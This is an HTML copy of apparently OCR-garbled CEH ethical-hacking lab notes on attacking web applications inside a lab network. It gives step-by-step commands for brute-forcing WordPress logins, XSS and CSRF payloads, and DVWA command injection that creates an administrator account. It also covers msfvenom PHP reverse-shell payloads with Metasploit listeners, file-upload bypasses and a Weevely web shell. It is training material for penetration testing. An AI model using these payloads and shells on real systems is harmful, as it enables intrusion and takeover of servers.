@@ -1,0 +1,788 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>CEH Module 11 Hacking-Web-Applications iLabs</title>
+</head><body><span style="color: #007f00">https://github.com/Samsar4/Ethical-Hacking-Labs<br/>
+<br/>
+</span><span style="color: #007f00">Perform web application reconnaissance</span><br/>
+<br/>
+In this task, the target website (www.moviescope.com) is hosted by the<br/>
+victim machine, Windows Server 2019.<br/>
+<br/>
+Use tools such as Netcraft (https:/ /www.netcraft.com), SmartWhois<br/>
+(https:/ /www.tamos.com), WHOIS Lookup<br/>
+(http:/ /whois.domaintools.com), and Batch IP Converter<br/>
+(http:/ /www.sabsoft.com) to perform the Whois lookup.<br/>
+<br/>
+Use tools such as Professional Toolset (https:/ /tools.dnsstuff.com),<br/>
+DNSRecon (https:/ / github.com), and DNS Records (https:/ / networktools.<br/>
+com), Domain Dossier (https:/ / centralops.net) to perform DNS interrogation.<br/>
+<br/>
+In the Parrot Terminal window, type <br/>
+nmap -T4 ·A -v &lt;Target WebApplication&gt; <br/>
+(here, the targetweb application is www.moviescope.com)<br/>
+and press Enter to perform a port and service discovery scan.<br/>
+<br/>
+Scroll down to see the complete results. You can observe that the target<br/>
+machine name, NetBIOS name, DNS name, MAC address, OS, and<br/>
+other information is displayed, as shown in the screenshot.<br/>
+<br/>
+type telnet www.moviescope.com 80 and press<br/>
+Enter<br/>
+<br/>
+The Trying 1 0.1 0.1 0.19 •.• message appears; <br/>
+type GET /HTTP/1.0 and press<br/>
+Enter two times.<br/>
+<br/>
+<span style="color: #007f00">Perform web application reconnaissance using WhatWeb</span><br/>
+<br/>
+In the Terminal window, type whatweb and press Enter. It displays a list<br/>
+of the commands available with WhatWeb.<br/>
+<br/>
+<br/>
+type whatweb &lt;Target Web Application&gt; (here, the target web<br/>
+application is www.moviescope.com) and press Enter toperform website<br/>
+footprinting on the target website.<br/>
+<br/>
+terminal, type whatweb -v &lt;Target Web Application&gt; (here, the<br/>
+targetweb application is www.moviescope.com) and press Enter to run<br/>
+a verbosity scan on the target website.<br/>
+<br/>
+Now, type whatweb --log-verbose=MovieScope_Report<br/>
+www.moviescope.com and press Enter to export the results returned<br/>
+by WhatWeb as a text flle.<br/>
+<br/>
+Type pluma MovieScope_Report and press Enter to open the resultant<br/>
+file.<br/>
+<br/>
+<i><b><span style="color: #007f00">Perform web spidering using OWASP ZAP</span></b></i><br/>
+<br/>
+A Parrot Terminal window appears; type zaproxy and press Enter to<br/>
+launch OWASP ZAP.<br/>
+<br/>
+After completing initialization, a prompt that reads Do you want to persist<br/>
+the ZAP Session? appears; select the No, I do not want to persist this<br/>
+session at this moment in time radio button and d ick Start.<br/>
+<br/>
+The Automated Scan wizard appears; enter the target website under the<br/>
+URL to attack field (here, www.moviescope.com). Leave the other<br/>
+setrings to default and dick the Attack button.<br/>
+<br/>
+The URLs tab contains various links for hidden content and functionality<br/>
+associated with the target website (www.moviescope.com) .<br/>
+<br/>
+Now, navigate to the Messages tabunder the Spider tab to view more<br/>
+detailed information regarding the URLs obtained while performing the<br/>
+web spidering, as shown in the screenshot.<br/>
+<br/>
+<b><i><span style="color: #007f00">Detect load balancers using various tools<br/>
+<br/>
+</span></i></b>In the Terminal window appears; type dig yahoo.com and press Enter<br/>
+<br/>
+The result appears, displaying the available load balancers of the target<br/>
+website,<br/>
+<br/>
+Now, type lbd yahoo.com and press Enter<br/>
+<br/>
+The result appears, displaying the available DNS load balancers used by<br/>
+the target website, as shown in the screenshot.<br/>
+<br/>
+N ote: lbd (load balancing detector) detects if a given domain uses DNS and<br/>
+http load balancing via the Server: and Date: headers and the differences<br/>
+between server answers. It analyzes the data received from application<br/>
+responses to detect load balancers.<br/>
+<br/>
+<span style="color: #007f00"><i><b>Identify web server directories<br/>
+<br/>
+</b></i></span>Here, we will use Nmap and Gobuster tool to identify web server directories on<br/>
+the target website.<br/>
+<br/>
+In the terminal window; type nmap -sV --script=http-enum &lt;target domain or IP address&gt;<br/>
+(here, the target website is<br/>
+www.moviescope.com) and press Enter.<br/>
+<br/>
+The result appears, displaying open ports and services, along with their<br/>
+Versions.<br/>
+<br/>
+Now, weshall copy the wordlist file ( common.txt) from a shared network<br/>
+drive. We will use this ftie in the Gobuster tool.<br/>
+<br/>
+type smb://1 0.1 0.1 0.10 and press Enter to access Windows 1 0 shared folders<br/>
+Navigate to CEHv11 Module 14 Hacking Web Applications, copy the<br/>
+common.txt file.<br/>
+<br/>
+Paste the common.tx.t into the /home/attacker directory, close the window.<br/>
+<br/>
+Now, switch back to the terminal window, Type mv<br/>
+/home/attacker/common.txt /root/Desktop/ and press Enter to move the<br/>
+common file to the Desktop.<br/>
+<br/>
+In the terminal window, type gobuster dir -u &lt;Target Website&gt; -w<br/>
+/root/Desktop/common.txt, and press Enter.<br/>
+Target website : http://www.moviescope.com<br/>
+<br/>
+<b><i><span style="color: #007f00">Perform web application vulnerability scanning using Vega<br/>
+</span></i></b><br/>
+In this task, the target website (http:/110.10.10.16:8080/dvwa) is hosted<br/>
+by the victim machirre Windows Server 2016; keep this machirre running until<br/>
+the end of the task. Here, the host machirre is the Windows 10 virtual machirre.<br/>
+<br/>
+Turn on the Windows Server 2016 virtual machine.<br/>
+<br/>
+Double-dick the WAMP Server shortcut icon from the Desktop to start<br/>
+the W AMP Server services.<br/>
+<br/>
+Switch to the Windows 1 0 virtual machine and log in with the credentials<br/>
+Admin and Pa$$w0rd<br/>
+<br/>
+<br/>
+After the installation completes, the Completing the Vega Setup Wizard<br/>
+appears; ensure d1at the Run Vega checkbox is selected and dick Finish.<br/>
+<br/>
+Click Scan from the menu bar and select Start New Scan from the<br/>
+available options<br/>
+<br/>
+The Select a Scan Target window appears on the screen. Ensure that the<br/>
+Enter a base URI for scan radio button is selected under the Scan<br/>
+Target section<br/>
+<br/>
+In the Enter a base URI for scan field, enter the target URL as<br/>
+http:/110.10.10.16:8080/dvwa and d ick Next.<br/>
+<br/>
+The Select Modules wizard appears; double-dick on both of the<br/>
+checkboxes (lnjection Modules and Response Processing Modules) to<br/>
+select all options<br/>
+<br/>
+In the left-hand pane, under the Scan Alerts section, you can see the<br/>
+scan status as Auditing. As soon as Vega completes, the scan status changes<br/>
+to Completed<br/>
+<br/>
+In the left-pane under Scan Alerts, expand the nodes to view the<br/>
+complete vulnerability scan result. Now, choose any one of the<br/>
+discovered vulnerabilities to display it on the respective page, as in the<br/>
+dashboard section shown in the screenshot.<br/>
+<br/>
+Choose any one vulnerability under the Scan Alerts section in the lefthand<br/>
+pane. Here, we are selecting the Cleartext Password over HTTP<br/>
+vulnerability; detailed information regarding the selected vulnerability will<br/>
+be displayed in the right section of the window, as shown in the<br/>
+screenshot.<br/>
+<br/>
+<span style="color: #007f00"><i><b>Identify clickjacking vulnerability using iframe<br/>
+</b></i></span><br/>
+In this task, we will identify clickjacking vulnerability in the target website<br/>
+(www.moviescope.com) hosted by the Windows Server 2019 virtual machine,<br/>
+and we will use the Windows 10 virtual machine as the host machine.<br/>
+<br/>
+Switch to the Windows 10 virtual machine. On Desktop, right-click<br/>
+anywhere, and navigate to New -7 Text Document to create a text<br/>
+document @e.<br/>
+<br/>
+<br/>
+<span style="color: #0000ff"><b>Perform Web Application Attacks</b><br/>
+</span><br/>
+<span style="color: #007f00"><b>Perform a brute-force attack using Burp Suite<br/>
+<br/>
+</b></span>In this task, the target WardPress website (http://1 0.1 0.1 0.16:8080/CEH)<br/>
+is hosted by the victim machine, Windows Server 2016. Keep this machine<br/>
+running until the end of the task. Here, the host machine is the Parrot Security<br/>
+virtual machine.<br/>
+<br/>
+Turn on the Parrot Security, Windows Server 2016 and Windows 10<br/>
+virtual machines<br/>
+<br/>
+On the Windows Server 2016 virtual machine, log in with the credentials<br/>
+Administrator and Pa$$w0rd.<br/>
+<br/>
+The Mozilla Firefox window appears; type<br/>
+http://1 0.1 0.1 0.16:8080/CEH/wp-login.php? Into the address bar and<br/>
+press Enter.<br/>
+<br/>
+<br/>
+Now, we shall set up a Burp Suite proxy by first configuring the proxy<br/>
+setrings of the browser.<br/>
+<br/>
+The Connection Settings window appears; select the Manual proxy<br/>
+configuration radio button and specify the HTTP Proxy as 127.0.0.1 and the<br/>
+Port as 8080. Tick the Use this proxy server for all protocols checkbox and<br/>
+dick OK. Close the Preferences tab.<br/>
+<br/>
+Now, minimize the browser window, dick the Applications menuform<br/>
+the top left corner of Desktop, and navigate to Pentesting -7 Web<br/>
+Application Analysis -7 Web Application Proxies -7 burpsuite to<br/>
+launch the Burp Suite application.<br/>
+<br/>
+The Burp Suite main window appears; ensure that the Temporary<br/>
+project radio button is selected and click the Next button, as shown in<br/>
+the screenshot.<br/>
+<br/>
+In the next window, select the Use Burp defaults raclio-button and dick the<br/>
+Start Burp button.<br/>
+<br/>
+The Burp Suite main window appears; dick the Proxy tab from the available<br/>
+options in the top section of the window<br/>
+<br/>
+In the Proxy settings, by default, the lntercept tab opens-up. Observe that<br/>
+by default, the interception is active as the button says lntercept is on. Leave 1t runrung.<br/>
+<br/>
+Switch back to the browser window. On the login page of the target<br/>
+WordPress website, type random credentials, here admin and password.<br/>
+Click the Log ln button.<br/>
+<br/>
+Now, right-click anywhere on the HTTP request window, and from the<br/>
+context menu, click Send to lntruder.<br/>
+<br/>
+Now, click on the lntruder tab from the toolbar and observe that under<br/>
+the lntruder tab, the Target tab appears by default<br/>
+<br/>
+Click on the Positions tabunder the lntruder tab and observe that Burp<br/>
+Suite sets the target positions by default, as shown in the HTTP request.<br/>
+Click the Clear § button from the left-pane to clear the default payload<br/>
+values.<br/>
+<br/>
+Once you clear the default payload values, select Cluster bomb from the<br/>
+Attack type drop-down list.<br/>
+<br/>
+Open any explorer window and press Ctri+L. The Location field appears;<br/>
+type smb://1 0.1 0.1 0.10 and press Enter to access Windows 1 0 shared folders<br/>
+<br/>
+<br/>
+Once the wordlist flies are selected as payload values, click the Start<br/>
+attack button to launch the attack<br/>
+<br/>
+After the progress bar completes, scroll down and observe the different<br/>
+values of Status and Length. Here, Status=302 and Length= 1131<br/>
+<br/>
+<br/>
+Perform parameter tampering using Burp Suite<br/>
+<br/>
+In this task, the target website (www.moviescope.com) is hosted by the<br/>
+victim machine, Windows Server 2019. K~eep this machine running until the end<br/>
+of the task. Here, the host machine is the Parrot Security virtual machine<br/>
+<br/>
+A Connection Settings window appears. Select the Manual proxy<br/>
+configuration radio button and dick OK. Close the Preferences tab.<br/>
+<br/>
+Now, keep clicking the Forward button until you are logged into the user<br/>
+account .<br/>
+<br/>
+<br/>
+<b><span style="color: #007f00">Exploit parameter tampering and XSS vulnerabilities in web applications</span></b><br/>
+<br/>
+In this task, the target website (www.moviescope.com) is hosted by the<br/>
+victim machine Windows Server 2019. K~eep this machine running until the end<br/>
+of the task. Here, the host machine is the Windows 10 virtual machine.<br/>
+<br/>
+Note: E nsure that the Windows Server 2019 virtual machine is running.<br/>
+<br/>
+On the Windows 1 0 virtual machine, log in with the credentials Admin and<br/>
+Pa$$w0rd.<br/>
+<br/>
+Open any web browser (here, Mozilla Firefox), type<br/>
+http://www.moviescope.com/ into the address bar, and press Enter.<br/>
+<br/>
+The MovieScope website appears. In the Login form, type Username and<br/>
+Password as steve and password, and click Login.<br/>
+<br/>
+Now, try to change the parameter in the address bar to id=1 and press Enter.<br/>
+<br/>
+Y Oll will be redirected to the profile of sam withollt having to perform any<br/>
+haclcing techniqlles to explore the database. Here, yoll can observe Sam's<br/>
+personal information under the View Profile tab, as shown in the screenshot.<br/>
+<br/>
+This process of changing the ID value and getting the result is known<br/>
+as parameter tampering. Web XSS attacks exploit vulnerabilities on<br/>
+dynamically generatedweb pages. This enables malicious attackers to inject<br/>
+client-side scripts into the web pages viewed by other users.<br/>
+<br/>
+Now, click the Contacts tab. Here you will be performing an XSS attack.<br/>
+<br/>
+The Contacts page appears; enter your name or any random name (here,<br/>
+steve) in the Name field; enter the cross-site script &lt;script&gt;alert(''You are<br/>
+hacked&quot;)&lt;/script&gt; in the Comment field and click the Submit Comment<br/>
+button.<br/>
+<br/>
+Y ou have successfully added a malicious script to d'lis page. The comment<br/>
+with the malicious link is stored on the server.<br/>
+<br/>
+<b><span style="color: #007f00">Perform cross-site request forgery (CSRF) attack</span></b><br/>
+<br/>
+CSRF attacks can be performed using various techniques and tools. Here, we will<br/>
+perform a CSRF attack using WPScan.<br/>
+<br/>
+Note: In this task, the target WardPress website (http://1 0.1 0.1 0.16:8080/CEH)<br/>
+is hosted by the victim machine Windows Server 2016. I&lt;eep this machine<br/>
+running until the end of the task. Here, the host machirre is the Parrot Security<br/>
+virtual machine.<br/>
+<br/>
+Double-dick the WAMP Server shortcut icon from Desktop to start the<br/>
+W AMP Server services<br/>
+<br/>
+Now, open any web browser (here, Mozilla Firefox) and type<br/>
+http://10.10.10.16:8080/CEH/wp-login.php? In the address bar, and press<br/>
+Enter.<br/>
+<br/>
+A WordPress webpage appears. Type Username or Email Address and<br/>
+Password as admin and qwerty@123. Click the Log ln button.<br/>
+<br/>
+Assurne that you have installed and configured the Firewall plugin for this<br/>
+site and that you want to check the security configurations.<br/>
+<br/>
+Ho ver your mouse cursor on Plugins in the left pane and dick lnstalled<br/>
+Plugins, as shown in the screenshot<br/>
+<br/>
+In the Plugins page, observe that leenk.me is installed. Click Activate under<br/>
+the leenk.me plugin to activate the pl11ooin.<br/>
+<br/>
+The leenk.me General Settings page appears. Tick the Facebook<br/>
+checkbox in the Choose which social network modules you want to<br/>
+enable for this site option under the Administrator Options section and<br/>
+dick the Save Settings button.<br/>
+<br/>
+The leenk.me General Settings page appears, as shown in the screenshot.<br/>
+Ensure that under the Administrator Options section, the Facebook<br/>
+checkbox is selected in the Choose which social network modules you<br/>
+want to enable for this site option and dick the Facebook Settings<br/>
+hyperlink<br/>
+<br/>
+A Facebook Settings page appears; under Message Settings, enter the<br/>
+details below:<br/>
+Default Message: 'Ibis is CEH Iab.<br/>
+Default Link Name: CEH.com<br/>
+Default Caption: CEH Labs<br/>
+<br/>
+<br/>
+Leave the user session running. Do not log out from the admin session<br/>
+of the WordPress site.<br/>
+<br/>
+Now, switch to the Parrot Security virtual machine. In the login page, the<br/>
+attacker username will be selected by default. Enter password as toor in<br/>
+the Password field and press Enter to log in to the machine.<br/>
+<br/>
+The Mozilla Firefox window appears. Type<br/>
+https://wpvulndb.com/users/sign_up into the address bar and press<br/>
+Enter.<br/>
+<br/>
+A webpage with a Register a new user form appears; enter your personal<br/>
+details in the given fields. In the Your Website field, enter the website as<br/>
+http://1 0.1 0.1 0.16:8080/CEH and dick the REGISTER button.<br/>
+<br/>
+On the next page, the WPScan Vulnerability Database appears along with<br/>
+a notification saying A message with a confirmation link has been sent<br/>
+to your email address .. .<br/>
+<br/>
+<br/>
+Once you are logged into your email account, open the email from<br/>
+noreply@wpvulndb.com, and in the email, click the Confirm my account<br/>
+hyperlink<br/>
+<br/>
+In the Terminal window, type wpscan -api-token &lt;API Token from<br/>
+Step#26&gt; --url http://1 0.1 0.1 0.16:8080/CEH -plugins-detection<br/>
+aggressive --enumerate vp and press Enter.<br/>
+Note: --enumerate vp: specifies the enumeration of vulnerable plugins.<br/>
+<br/>
+Now, in the terminal window, type cd /home/attacker/Desktop/ and press<br/>
+Enter.<br/>
+<br/>
+Now, type pluma and press Enter to open a text editor window.<br/>
+<br/>
+A Pluma text editor window appears. Type the following script in the<br/>
+document:<br/>
+<br/>
+<span style="font-size: 15pt">&lt;html&gt;<br/>
+&lt;body onload=&quot;document.forms['CSRF'].submit()&quot; &gt;<br/>
+&lt;form name= &quot;CSRF&quot; action=&quot;http://10.10.10.16:8080/CEH/wpadmin/admin.php?page=leenkme_facebook&quot; method= &quot;POST&quot;&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;facebook_profile&quot; value= &quot;on&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;fb_publish_wpnonce&quot; value=&quot; &quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;_wp_http_referer&quot; value=&quot;CSRF&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;facebook_message value=&quot;Hacked!!!&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;facebook_linkname value= &quot;CSRF&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;facebook_caption&quot; value= &quot;CSRF''/&gt;<br/>
+&lt;input type=''hidden&quot; name=&quot;facebook_description&quot; value=&quot;&lt;/textarea&gt;;&lt;script&gt;prompt();&lt;/script&gt;&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;default_image&quot; value= &quot;CSRF&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;message_preference&quot; value= &quot;author&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;clude&quot; value=&quot;in&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;publish_cats[];&quot; value= &quot;O&quot; /&gt;<br/>
+&lt;input type=&quot;hidden&quot; name=&quot;update_facebook_settings&quot; value= &quot;Save Settings&quot; /&gt;<br/>
+&lt;input type=&quot;submit&quot; value=&quot;Submit form&quot; /&gt;<br/>
+&lt;/form&gt;<br/>
+&lt;/body&gt;<br/>
+</span><span style="font-size: 15pt">&lt;/html&gt;</span><br/>
+<br/>
+<br/>
+The Save As ••window appears; choose the desired location to save the file<br/>
+Q1ere, /home/attacker/Desktop). In the Name field, type the name of the<br/>
+file as Security_Script.html and dick the Save button.<br/>
+<br/>
+Switch to the Windows Server 2016 virtual machine, navigate to the location<br/>
+Z:\CEHv11 Module 14 Hacking Web Applications (shared network drive),<br/>
+copy the Security_Script.html @e, and paste it onto Desktop.<br/>
+<br/>
+<br/>
+Enumerate and hack a web application using WPScan and Metasploit<br/>
+<br/>
+In this task, we will perform multiple attacks on a vulnerable PHP website<br/>
+(WordPress) in an attempt to gain sensitiveinformationsuch as usernames and<br/>
+passwords.<br/>
+<br/>
+Ensure that the Windows Server 2016 virtual machirre is running.<br/>
+<br/>
+Note: The password that you type will not be visible.<br/>
+<br/>
+In the Terminal window, type wpscan -api-token &lt;API Token&gt; --url<br/>
+http:/110.10.10.16:8080/CEH -enumerate u and press Enter.<br/>
+<br/>
+N ote: --enumerate u: specifi.es the enumeration of usernames<br/>
+<br/>
+To obtain the passwords, you will use the auxiliary module called<br/>
+wordpress_login_enum (in msfconsole) to perform a dictionary attack<br/>
+using the password.txt ftie (in the Wordlist folder) which you copied to<br/>
+the location /home/attacker/Desktop in the previous task.<br/>
+<br/>
+In the terminal window, type service postgresql start and press Enter<br/>
+to start the PostgreSQL service.<br/>
+<br/>
+Type msfconsole and press Enter to launch the Metasploit frarnework.<br/>
+<br/>
+In msfconsole, type use auxiliary/scanner/http/wordpress_login_enum<br/>
+and press Enter.<br/>
+<br/>
+Now, in the msfconsole, type the below commands<br/>
+<br/>
+Type set PASS_FILE<br/>
+/home/attacker/Desktop/Wordlist/password.txt and press Enter to<br/>
+set the file containing the passwords. (here, we are using the<br/>
+passwords.txt password ftie) .<br/>
+<br/>
+Type set RHOSTS [IP Address of Windows Server 2016] (here,<br/>
+10.10.10.16) and press Enter to set the target IP address. (Here, the<br/>
+IP address of Windows Server 2016 is 10.10.10.16).<br/>
+<br/>
+Type set RPORT 8080 and press Enter to set d1e target port.<br/>
+<br/>
+Type set TARGETURI http://[IP Address of Windows Server<br/>
+2016]:8080/CEH and press Enter to set the base path to the<br/>
+WordPress website (Here, the IP address of Windows Server 2016<br/>
+is 10.10.10.16).<br/>
+<br/>
+Type set USERNAME admin and press Enter to set the username as<br/>
+admin.<br/>
+<br/>
+All the options have successfully been set. Type run and press Enter to<br/>
+execute the auxiliary module<br/>
+<br/>
+Now, use the obtained username-password combination to log into the<br/>
+WardPress website. (Here, U sername: admin and Password:<br/>
+qwerty@123).<br/>
+<br/>
+In the address field, type http://[IP Address of Windows Server<br/>
+2016]:8080/CEH/wp-login.php in the address bar and d ick the Log ln<br/>
+button.<br/>
+<br/>
+Exploit a remote command execution vulnerability to compromise a target<br/>
+web server<br/>
+<br/>
+In this task, we will perform command-line execution on a vulnerability found in<br/>
+DVW A. Here, you willlearn how to extract information about a target machine,<br/>
+create a user account, assign administrative privileges to the created account, and<br/>
+use that account to log in to the target machine<br/>
+<br/>
+Ensure that the Windows Server 2016 virtual machine is running.<br/>
+<br/>
+On the Windows Server 2016 virtual machine, ensure that WampServer is runrung.<br/>
+<br/>
+Switch to the Windows 10 virtual machirre and log in with the credentials<br/>
+Admin and Pa$$w0rd.<br/>
+<br/>
+Open any web browser (here, Mozilla Firefox), type<br/>
+http:/110.10.10.16:8080/dvwa/login.php into the address bar, and press<br/>
+Enter.<br/>
+<br/>
+The DVWA login page appears; type the Username and Password as<br/>
+gordonb and abc123. Click the Login button.<br/>
+<br/>
+Y ou are successfully logged in, and the DVWA main webpage appears.<br/>
+Click Command lnjection from the options available in the left pane.<br/>
+<br/>
+The Vulnerability: Command lnjection page appears; under the Ping a<br/>
+device section, type the IP address of the Windows Server 2016 virtual<br/>
+machine (here, 10.10.10.16) into the Enter an IP address field and click<br/>
+the Submit button to ping the machine<br/>
+<br/>
+Type | hostname into the Enter an IP address field and dick Submit.<br/>
+This command is used to probe the hostname of the target machine.<br/>
+<br/>
+The result indicates that the DVWA application is secure.<br/>
+<br/>
+Now, check the security setring of the web application. To do so, click<br/>
+DVWA Security in the left pane.<br/>
+<br/>
+Now, to exploit the command execution vulnerability, set the Security<br/>
+Level of the web application to low by selecting the option Low from the<br/>
+drop-down list and dick Submit.<br/>
+<br/>
+Click Command lnjection from the left -pane.<br/>
+<br/>
+The Vulnerability: Command lnjection page appears; type 1 hostname<br/>
+into the Enter an IP address field, and click Submit.<br/>
+<br/>
+Now, extract more information regarding the target machine, Windows<br/>
+Server 2016<br/>
+<br/>
+Type the command | whoami and dick Submit<br/>
+<br/>
+Now, type | tasklist, and dick Submit to view the processes running on<br/>
+the machine.<br/>
+<br/>
+Type 1 Taskkiii /PID [Process ID value of the desired process] /F (here,<br/>
+PID is 2192) and dick Submit. By issuing this command, you are<br/>
+forcefully (!F) terminating the process.<br/>
+<br/>
+Now, to view the directory structure of the Windows Server 2016 virtual<br/>
+machine, type 1 dir C:\ and dick Submit to view the flies and directories<br/>
+on the C:\ drive.<br/>
+<br/>
+Now, try to obtain information related to user accounts.<br/>
+<br/>
+To view user account information, type 1 net user, and dick Submit.<br/>
+<br/>
+Create an account named Test. To do so, type 1 net user Test /Add and<br/>
+click Submit.<br/>
+<br/>
+To grantadministrative privileges, type 1 net localgroup Administrators<br/>
+Test /Add and dick Submit<br/>
+<br/>
+<br/>
+Exploit a file upload vulnerability at different security levels<br/>
+<br/>
+Here, we will use exploit a file upload vulnerability at different security levels of<br/>
+DVW A using Metasploit.<br/>
+<br/>
+Note: Before starring this task, ensure that the WampServer is running on the<br/>
+Windows Server 2016 virtual machine<br/>
+<br/>
+<br/>
+Now, type cd and press Enter to jump to the root directory.<br/>
+<br/>
+A Parrot Terminal window appears; type msfvenom -p<br/>
+php/meterpreter/reverse_tcp LHOST=&lt;IP Address of Host Machine&gt;<br/>
+LPORT=4444 -f raw and press Enter.<br/>
+<br/>
+Note: Here, the IP address of the host machine is 10.10.10.13 (the<br/>
+Parrot Security virtual machine).<br/>
+<br/>
+The raw payload is generated in the terminal window. Select the payload,<br/>
+right-click on it, and click Copy from the context menu to copy the<br/>
+payload, as shown in the screenshot.<br/>
+<br/>
+Click the Firefox icon from the top section of Desktop, type<br/>
+http://1 0.1 0.1 0.16:8080/dvwa/login.php. Into the address bar and press<br/>
+Enter.<br/>
+<br/>
+The DVWA login page appears; enter the Username and Password as<br/>
+admin and password. Click the Login button.<br/>
+<br/>
+Change the security level from impossible to low by selecting Low from<br/>
+the drop-down list and clicking the Submit button, as shown in the<br/>
+screenshot.<br/>
+Click the File Upload option from the left pane.<br/>
+The Vulnerability: File Upload page appears; click the Browse ••button<br/>
+to upload a ftie.<br/>
+When the File Upload window appears, navigate to the Desktop location,<br/>
+select the payload ftie upload.php, and dick Open.<br/>
+In the terminal window, type msfconsole and press Enter to launch the<br/>
+Metasploit framework.<br/>
+<br/>
+In msfconsole, type use exploit/multi/handler and press Enter to set up<br/>
+the listener<br/>
+Now, set the payload, LHOST, and LPORT. To do so, use the below<br/>
+commands:<br/>
+<br/>
+Type set payload php/meterpreter/reverse_tcp and press Enter<br/>
+Type set LHOST 10.10.10.13 and press Enter<br/>
+Type set LPORT 4444 and press Enter<br/>
+Type run and press Enter tostart the listener<br/>
+<br/>
+Switch back to the Mozilla Firefox window where the DVWA website is<br/>
+open. Press Ctri+T to open a new tab, type<br/>
+http:/11 0.1 0.1 0.16:8080/dvwa/hackable/uploads/upload.php) in the address<br/>
+bar, and press Enter to execute the uploaded payload.<br/>
+<br/>
+Switch back to the Terminal window and observe that a Meterpreter<br/>
+session has successfully been established with the victim system, as shown<br/>
+in the screenshot<br/>
+<br/>
+In the meterpreter command line, type sysinfo and press Enter to view the<br/>
+system details of the victim machine.<br/>
+<br/>
+Close all open windows.<br/>
+<br/>
+In the Terminal window, type msfvenom -p<br/>
+php/meterpreter/reverse_tcp LHOST=&lt;IP Address of Host Machine&gt;<br/>
+LPORT=3333 -f raw and press Enter.<br/>
+Type pluma medium.php.jpg and press Enter to launch the Pluma text<br/>
+editor.<br/>
+Observe that the selected file (medium.php.jpg) appears to the right of<br/>
+the Browse ••button<br/>
+<br/>
+Now, before uploading the @e, set up a Burp Suite proxy. Start by<br/>
+configuring the proxy setrings of the browser.<br/>
+<br/>
+Now, minimize the browser window, dick Applications from the top left<br/>
+corner of Desktop and navigate to Pentesting ~ Web Application<br/>
+Analysis ~ Web Application Proxies ~ burpsuite to launch the Burp<br/>
+Suite application.<br/>
+<br/>
+72. In the Terminal window, type msfconsole and press Enter to launch the<br/>
+Metasploit framework<br/>
+<br/>
+In msfconsole, type use exploit/multi/handler and press Enter to begin<br/>
+setring up the listener.<br/>
+<br/>
+Type set payload php/meterpreter/reverse_tcp and press Enter<br/>
+Type set LHOST 10.10.10.13 and press Enter<br/>
+Type set LPORT 3333 and press Enter .<br/>
+Type run and press Enter tostart the listener<br/>
+<br/>
+Switch to the Mozilla Firefox window where the DVWA website is open.<br/>
+Press Ctri+T to open a new tab, type<br/>
+http://1 0.1 0.1 0.16:8080/dvwa/hackable/uploads/medium.php) into the<br/>
+address bar and press Enter to execute the uploaded payload<br/>
+<br/>
+Close all open windows<br/>
+<br/>
+Launch a Terminal window by clicking on the MATE Terminal icon at<br/>
+the top of Desktop.<br/>
+<br/>
+In the Terminal window, type msfvenom ·P php/meterpreter/reverse_tcp<br/>
+LHOST=&lt;IP Address of Host Machine&gt; LPORT=2222 ·f raw and press<br/>
+Enter.<br/>
+The raw payload is generated in the terminal window. Select the payload,<br/>
+right-click on it, and click Copy from the context menu to copy the<br/>
+payload, as shown in the screenshot.<br/>
+<br/>
+Now, in the terminal window, type cd /home/attacker/Desktop and<br/>
+press Enter to navigate to the Desktop folder.<br/>
+<br/>
+Type pluma high.jpeg and press Enter to launch the Pluma text editor.<br/>
+<br/>
+Edit the payload file by adding GIF98 to the first line and press Ctri+S to save<br/>
+the content.<br/>
+<br/>
+Click the Firefox icon from the top section of Desktop, type<br/>
+http:/110.10.10.16:8080/dvwa/login.php into the address bar and press<br/>
+Enter. The DVWA login page appears. Log in with the credentials admin<br/>
+and password, and click the Login button.<br/>
+<br/>
+Now, chck the Command lnjection option in the left pane. The<br/>
+Vulnerability: Command lnjection window appears; in the Enter an IP<br/>
+address field, type lcopy<br/>
+C:\wamp64\www\DVWA\hackable\uploads\high.jpeg<br/>
+C:\wamp64\www\DVWA\hackable\uploads\shell.php and chck the Submit<br/>
+button.<br/>
+<br/>
+In the Terminal window, type msfconsole and press Enter to launch the<br/>
+Metasploit framework.<br/>
+<br/>
+In msfconsole, type use exploitlmulti/handler and press Enter to set up the<br/>
+listener.<br/>
+<br/>
+Type set payload php/meterpreter/reverse_tcp and press Enter<br/>
+Type set LHOST 10.10.10.13 and press Enter<br/>
+Type set LPORT 2222 and press Enter<br/>
+Type run and press Enter tostart the listener<br/>
+<br/>
+Switch to the Mozilla Firefox window where the DVWA website is open.<br/>
+Press Ctri+T to open a new tab, type<br/>
+http://1 0.1 0.1 0.16:8080/dvwa/hackable/uploads/shell.php) into the address<br/>
+bar and press Enter to execute the uploaded payload.<br/>
+<br/>
+Switch back to the Terminal window and observe that a Meterpreter session<br/>
+has successfully been established with the victim system.<br/>
+<br/>
+In the meterpreter command line, type sysinfo and press Enter to view the<br/>
+system details of the victim machine.<br/>
+<br/>
+Gain backdoor access via a web shell using Weevely<br/>
+<br/>
+Here, we will gain backdoor access via a web shell using Weevely.<br/>
+<br/>
+Note: Ensure that the Windows Server 2016 and Parrot Security virtual machines are runrung.<br/>
+<br/>
+In the [sudo) password for attacker field, type toor as a password and<br/>
+press Enter.<br/>
+<br/>
+In the terminal window; type weevely generate &lt;Password&gt; &lt;File<br/>
+Path&gt; (here, the password is toor, and the file path is<br/>
+/home/attacker/Desktop/shell.php) and press Enter to generate a shell<br/>
+file.<br/>
+<br/>
+weevely generate toor /home/attacker/Desktop/shell.php<br/>
+<br/>
+Change the Security Level from impossible to low by selecting Low from<br/>
+the drop-down list and clicking the Submit button, as shown in the<br/>
+screenshot.<br/>
+<br/>
+The File Upload window appears; navigate to the Desktop location,<br/>
+select the payload ftie shell.php, and dick Open.<br/>
